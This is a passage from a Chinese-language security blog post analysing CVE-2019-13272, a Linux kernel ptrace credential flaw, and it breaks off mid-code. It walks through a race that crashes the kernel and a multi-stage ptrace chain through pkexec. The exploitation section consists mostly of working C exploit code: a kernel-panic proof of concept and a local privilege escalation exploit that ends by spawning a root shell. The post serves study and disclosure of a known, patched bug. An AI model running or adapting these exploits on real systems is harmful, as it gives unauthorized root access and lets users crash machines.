的流程</p><p>看起来好像没什么问题，在进入释放函数前已有一次检查，想必没有可能引起 kernel panic，<strong>实则不然</strong>，我们考虑如下竞态场景：</p><ul><li>父进程不断地更新自身 cred</li><li>子进程不断地调用 <code>ptrace(PTRACE_TRACEME, 0, NULL, NULL)</code></li></ul><p>在这种场景下，若是父进程在更新自身 cred 时，在父进程替换自身 cred 之前子进程获取到了父进程的旧 cred，在父进程进入到 <code>put_cred_rcu</code> 函数之后子进程刚好才将旧 cred 的引用计数 +1，此时便<strong>无法通过释放函数中的引用计数检查，从而造成 kernel panic</strong></p><h2 id="ptracer-cred-设置的逻辑错误导致本地提权"><a href="#ptracer-cred-设置的逻辑错误导致本地提权" class="headerlink" title="ptracer_cred 设置的逻辑错误导致本地提权"></a>ptracer_cred 设置的逻辑错误导致本地提权</h2><p>这个逻辑漏洞的利用在笔者看来<strong>十分巧妙</strong>，在正常情况下普通权限的 ptracer 确乎是无法调试执行 suid 程序的 pracee 的，但是 Jann Horn 提出了一个十分巧妙的<strong>多级 ptrace 方案</strong></p><p>我们现在来考虑如下场景：</p><ul><li>进程 A fork 出子进程 B</li><li>进程 B fork 出子进程 C</li><li>进程 B 执行一个<strong>先提权后降权的</strong> suid 程序</li><li>进程 C 检测到进程 B 提权后发起 <code>PTRACE_RTRACEME</code> 请求，随后执行一个 suid 程序，此时因为进程 B 已经提权所以 ptrace link 建立成功，<strong>此时进程 C 为 root 权限</strong></li><li>进程 A 检测到进程 B 执行 suid 程序后，主动 ptrace attach 进程 B</li><li>此时<strong>进程 B 已经完成降权，故进程 A 可以 ptrace 进程 B，而进程 B 已经与进程 C 建立了 ptrace link，此时进程 C 在判断进程 B 权限时使用的是此前保存的 root cred，故进程 B 可以 ptrace 进程 C 让其在 root 权限下执行恶意代码</strong></li></ul><p>听起来似乎需要一些条件竞争？而且我们似乎很难找到这样一个 suid 程序，<strong>这令这个漏洞变得十分的鸡肋</strong>，我们只能在一些特定发行版下完成利用</p><h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02.漏洞利用"></a>0x02.漏洞利用</h1><h2 id="利用竞态条件造成-kernel-panic"><a href="#利用竞态条件造成-kernel-panic" class="headerlink" title="利用竞态条件造成 kernel panic"></a>利用竞态条件造成 kernel panic</h2><p>前面我们已经讲到开两个进程进行竞争便能触发 kernel panic，而合法更新父进程的 cred 的方式有很多，例如 <code>setresuid</code> 这一系列的系统调用便能合法更新进程的 cred，这里我们便选用 setresuid 系统调用</p><p>exp 如下，这里参考了 jannh 给出的 poc：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">ptraceThread</span><span class="params">(<span class="type">void</span> *args)</span></span><br><span class="line">&#123;</span><br><span class="line">    ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pthread_t</span> child;</span><br><span class="line">    <span class="type">int</span> uid;</span><br><span class="line">    <span class="type">int</span> pid;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] CVE-2019-13272 POC of kernel panic.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Written by arttnba3.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Start exploiting...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uid = getuid();</span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid != <span class="number">0</span>) <span class="comment">// parent</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            setresuid(uid, uid, uid);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="comment">// child</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            pthread_create(&amp;child, <span class="literal">NULL</span>, ptraceThread, <span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="https://s2.loli.net/2022/01/14/Cl1RPwcj5s8OLrf.png" alt="image.png"></p><p>可以看到的是我们成功利用该漏洞造成了 kernel panic</p><h2 id="利用逻辑错误进行本地提权"><a href="#利用逻辑错误进行本地提权" class="headerlink" title="利用逻辑错误进行本地提权"></a>利用逻辑错误进行本地提权</h2><p>我们先介绍一个新玩意——<code>PolKit</code>，这是一个应用程序框架，相比起 sudo 等传统特权授权程序，polkit 可以进行更细粒度的权限授予，这里不深入研究其用法</p><p>接下来我们需要用到一个大部分 Linux 桌面发行版都有的 suid 程序—— <code>pkexec</code>，这是 polkit 中的工具之一，其允许获得授权的用户以另一用户的身份执行特定程序，如下是我们将会用到的指令执行格式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pkexec -user username some_programme_under_polkit</span></span><br></pre></td></tr></table></figure><p>当我们使用 <code>-user</code> 参数时， pkexec 会<strong>先将进程提权到 root，之后再降权到指定用户</strong>，这恰好可以用来构造我们 ptrace 利用链上的进程 B</p><p>此外，我们需要执行一个<strong>在 polkit 框架下运行的可执行程序</strong>（Jann Horn 称之为 helper），helper 需要满足的是<strong>普通用户执行时不需要认证</strong>（很多 polkit 程序执行时都需要弹窗认证）</p><p>接下来我们解决利用流程中条件竞争的问题，这里我们可以使用_管道_来控制程序执行的时机，从而让对应的三个进程能够在对应时机执行对应操作</p><p>下面我们分阶段对 exp 进行讲解，这里的 exp 笔者参考了 Jann 的exp 进行重新编写，经过笔者的一些<del>自以为是的</del>优化</p><h3 id="Setp-I-task-A-fork-task-B"><a href="#Setp-I-task-A-fork-task-B" class="headerlink" title="Setp.I task A fork task B"></a>Setp.I task A fork task B</h3><p>这里的 main 函数笔者设计为主要实现 task A 的功能，同时也作为后面 task B 与 task C 通过 execveat 替换自身镜像时的跳转入口</p><p>findHelper() 用以寻找当前平台可用的 helper，不再赘叙</p><p>task A 首先需要创建一个管道，后面我们需要将 task B 的 stdout 重定向至该管道以让其堵塞，因此我们需要将管道设为 <code>O_DIRECT</code> 模式，这意味着该管道传输数据的方式是按 “packet” 进行传输的，随后我们先往其中填充一个 packet，后面 task B 在写入  stdout 时便会堵塞（为什么要阻塞后面细说）</p><p>创建完成管道之后便 fork 出 task B，接下来我们来看 task B 的流程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;stage2&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> middleStage();</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;stage3&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> getRootShell();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] CVE-2019-13272 POC of local privileged.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Written by arttnba3.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Start exploiting...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// find the helper</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Finding the helper...&quot;</span>);</span><br><span class="line">    helper = findHelper();</span><br><span class="line">    helper_basename = basename(helper);</span><br><span class="line">    <span class="keyword">if</span> (!helper)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[x] Unable to find suitable helper on your platform!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Using helper: %s\n&quot;</span>, helper);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create the pipe for blocking child</span></span><br><span class="line">    pipe2(pipe_for_block, O_DIRECT | O_CLOEXEC); <span class="comment">// set the pipe in packet mode, which meant that the data should be received in packets</span></span><br><span class="line">    fcntl(pipe_for_block[<span class="number">0</span>], F_SETPIPE_SZ, <span class="number">0x1000</span>);</span><br><span class="line">    write(pipe_for_block[<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>); <span class="comment">// temp packet to make the following ones stuck, the stdout of task B will be redirect to it</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// fork out task B</span></span><br><span class="line">    <span class="comment">// two kinds of writing, all OK</span></span><br><span class="line">    <span class="comment">// pid_task_b = clone(middlePtracee, (size_t)malloc(0x1000 * 100) + 0x1000 * 100, CLONE_VM | CLONE_VFORK | SIGCHLD, NULL);</span></span><br><span class="line">    pid_task_b = fork();</span><br><span class="line">    <span class="keyword">if</span> (!pid_task_b)</span><br><span class="line">    &#123;</span><br><span class="line">        middlePtracee();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><h3 id="Step-II-task-B-fork-task-C"><a href="#Step-II-task-B-fork-task-C" class="headerlink" title="Step.II task B fork task C"></a>Step.II task B fork task C</h3><p>task B 主要的工作笔者都将其封装在 <code>middlePtracee()</code> 中，首先还是 fork 出 task C，<strong>此时 task A 与 task C 都在监视 task B 的状态</strong></p><p>接下来 task B 将自身的 stdin 重定向自 <code>/proc/self/exe</code> ，<strong>将 stdout 重定向至阻塞的管道</strong>，这是因为在接下来我们执行 pkexec 时，pkexec 的输出走 stderr，因此提权-&gt;降权这一流程并不会阻塞，而 pkexec 执行的 helper 的输出则走 stdout，<strong>此时程序会阻塞在这里，且 task B 已经降权，因此 task A 可以借此时机接管 task B</strong></p><p>重定向完成后便是常规的执行 <code>pkexec</code> 的流程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// task B</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">middlePtracee</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    self_fd = open(<span class="string">&quot;/proc/self/exe&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">passwd</span> *<span class="title">pw</span> =</span> getpwuid(getuid());</span><br><span class="line">    pid_task_b = getpid();</span><br><span class="line"></span><br><span class="line">    pid_task_c = fork();</span><br><span class="line">    <span class="keyword">if</span> (!pid_task_c)</span><br><span class="line">        <span class="keyword">return</span> finalPtracee();</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;[+] Task B fork out task C.\n&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;[*] Task B execve pkexec soooon...\n&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">    dup2(self_fd, <span class="number">0</span>); <span class="comment">// got stdin close</span></span><br><span class="line">    dup2(pipe_for_block[<span class="number">1</span>], <span class="number">1</span>); <span class="comment">// redirect stdout to block it</span></span><br><span class="line">    execl(<span class="string">&quot;/usr/bin/pkexec&quot;</span>, basename(<span class="string">&quot;/usr/bin/pkexec&quot;</span>), <span class="string">&quot;--user&quot;</span>, pw-&gt;pw_name, helper, <span class="string">&quot;--helper&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we arrive there, we failed.</span></span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;[x] Failed to execve pkexec!&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Step-III-task-C-get-root"><a href="#Step-III-task-C-get-root" class="headerlink" title="Step.III task C get root"></a>Step.III task C get root</h3><p>task B 执行 pkexec 之后会提权到 root，当 task C 监视到 task B 执行 pkexec 后便调用 <code>ptrace(PTRACE_TRACEME, 0, NULL, NULL)</code> 来获取 task B 的 root cred，<strong>从而令 task C 的 ptracer_cred 为 root cred</strong>，此时 task C 再执行一个 suid 程序便能以 root 权限执行，<strong>且仍保持着被 task B ptrace 的状态</strong></p><p>这里我们选择执行 <code>/usr/bin/passwd</code>，因为其会等待用户输入而不会直接退出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// task C</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">finalPtracee</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    pid_task_c = getpid();</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="type">char</span> needle[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">char</span> uid_buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> task_B_status_fd;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(needle, <span class="string">&quot;/proc/%d/status&quot;</span>, pid_task_b);</span><br><span class="line">    <span class="built_in">sprintf</span>(uid_buf, <span class="string">&quot;Uid:\t%d\t0\t&quot;</span>, getuid());</span><br><span class="line">    dup2(self_fd, <span class="number">114</span>);</span><br><span class="line">    task_B_status_fd = open(needle, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (task_B_status_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;[x] Failed to get status of task B!&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check out uid of task B</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        buf[pread(task_B_status_fd, buf, <span class="number">0x1000</span> - <span class="number">1</span>, <span class="number">0</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, uid_buf)) <span class="comment">// task B got root</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// let task B(root) be ptracer</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Task B is root now!&quot;</span>);</span><br><span class="line">    ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Task C execve another suid programme sooooon...&quot;</span>);</span><br><span class="line">    execl(<span class="string">&quot;/usr/bin/passwd&quot;</span>, <span class="string">&quot;passwd&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we arrived there, execve failed </span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[x] Task C failed to execve!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Step-IV-task-A-attach-task-B"><a href="#Step-IV-task-A-attach-task-B" class="headerlink" title="Step.IV task A attach task B"></a>Step.IV task A attach task B</h3><p>task A 在 fork 出 task B 之后便持续监视 task B 的状态，当 task B 执行 helper 时<strong>说明 task B 已经降权并阻塞，此时 task A 便有足够的权限 ptrace task B</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sprintf</span>(buf, <span class="string">&quot;/proc/%d/comm&quot;</span>, pid_task_b);</span><br><span class="line">   <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="type">char</span> comm[<span class="number">0x100</span>];</span><br><span class="line">       <span class="type">int</span> comm_fd = open(buf, O_RDONLY);</span><br><span class="line">       <span class="keyword">if</span> (comm_fd &lt; <span class="number">0</span>)</span><br><span class="line">       &#123;</span><br><span class="line">           <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[x] Failed to read comm of task B!\n&quot;</span>);</span><br><span class="line">           <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">       &#125;</span><br><span class="line">       comm[read(comm_fd, comm, <span class="number">0x100</span> - <span class="number">1</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">       <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(comm, helper_basename, <span class="number">10</span>))</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">       usleep(<span class="number">100000</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// task B got the root, wait a while it&#x27;ll lose privilege, then task A attach to it</span></span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[*] Task A attaching to task B soooon...&quot;</span>);</span><br><span class="line">   ptrace(PTRACE_ATTACH, pid_task_b, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">   waitpid(pid_task_b, <span class="literal">NULL</span>, <span class="number">0</span>); <span class="comment">// 0 means no extra options</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure><h3 id="Step-V-get-privileged-by-multistage-ptrace-link"><a href="#Step-V-get-privileged-by-multistage-ptrace-link" class="headerlink" title="Step.V get privileged by multistage ptrace link"></a>Step.V get privileged by multistage ptrace link</h3><p>当程序运行到这一步时，<strong>我们已经成功建立了</strong> <code>task A -&gt; task B -&gt; task C</code> <strong>这一多级 ptrace 链条</strong>，此时 task A、B 为用户权限，task C 为 root 权限，<strong>而 task C 保存的 ptracer_cred 同为 root 权限</strong>，因此我们可以通过 task A 控制 task B 控制 task C 来完成提权</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">// in task A</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// force the task B to execve stage2</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Forcing task B to execve stage2...&quot;</span>);</span><br><span class="line">    forceChildToExecve(pid_task_b, <span class="number">0</span>, <span class="string">&quot;stage2&quot;</span>);</span><br><span class="line">    <span class="comment">//force_exec_and_wait(pid_task_b, 0, &quot;stage2&quot;);</span></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// task again B</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">middleStage</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pid_t</span> child = waitpid(<span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    forceChildToExecve(child, <span class="number">114</span>, <span class="string">&quot;stage3&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// task again C</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    setresuid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    setresgid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里用到了一个自行编写的 <code>forceChildToExecve()</code> 函数，主要是控制 ptracee 进程通过 execveat 系统调用执行回 exp 程序的不同入口，具体细节参见注释，这里不再赘叙</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// force a child to execve by ptrace through execveat syscall</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">forceChildToExecve</span><span class="params">(<span class="type">pid_t</span> child_pid, <span class="type">int</span> exec_fd, <span class="type">char</span> *argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> </span><br><span class="line">    &#123;</span><br><span class="line">        .iov_base = &amp;regs,</span><br><span class="line">        .iov_len = <span class="keyword">sizeof</span>(regs),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">size_t</span> child_stack;</span><br><span class="line">    <span class="type">size_t</span> insert_data[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">    ptrace(PTRACE_SYSCALL, child_pid, <span class="number">0</span>, <span class="literal">NULL</span>); <span class="comment">// wait for child meeting a syscall</span></span><br><span class="line">    waitpid(child_pid, <span class="literal">NULL</span>, <span class="number">0</span>);    <span class="comment">// wait for child to execve</span></span><br><span class="line">    ptrace(PTRACE_GETREGSET, child_pid, NT_PRSTATUS, &amp;iov); <span class="comment">// get env of child</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// prepare the stack data</span></span><br><span class="line">    child_stack = (regs.rsp - <span class="number">0x1000</span>) &amp; ~<span class="number">0xfff</span>UL; </span><br><span class="line">    <span class="built_in">memset</span>(insert_data, <span class="number">0</span>, <span class="keyword">sizeof</span>(insert_data));</span><br><span class="line">    <span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line">    insert_data[idx++] = child_stack + <span class="number">0x18</span>;    <span class="comment">// argv arrays</span></span><br><span class="line">    insert_data[idx++] = <span class="number">0</span>;</span><br><span class="line">    insert_data[idx++] = <span class="number">0</span>;                     <span class="comment">// env arrays</span></span><br><span class="line">    insert_data[idx++] = *(<span class="type">size_t</span>*)argv;          <span class="comment">// argv[0]</span></span><br><span class="line">    insert_data[idx++] = <span class="number">0</span>;                     <span class="comment">// path</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// copy to child stack</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; idx; i++)</span><br><span class="line">        ptrace(PTRACE_POKETEXT, child_pid, child_stack + i * <span class="keyword">sizeof</span>(<span class="type">size_t</span>), insert_data[i]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// execveat(exec_fd, NULL, argv, NULL, flags)</span></span><br><span class="line">    regs.orig_rax = __NR_execveat;</span><br><span class="line">    regs.rdi = exec_fd;</span><br><span class="line">    regs.rsi = child_stack + <span class="number">0x20</span>;  <span class="comment">// path -&gt; NULL</span></span><br><span class="line">    regs.rdx = child_stack;         <span class="comment">// argv -&gt; &quot;stagex&quot;, NULL</span></span><br><span class="line">    regs.r10 = child_stack + <span 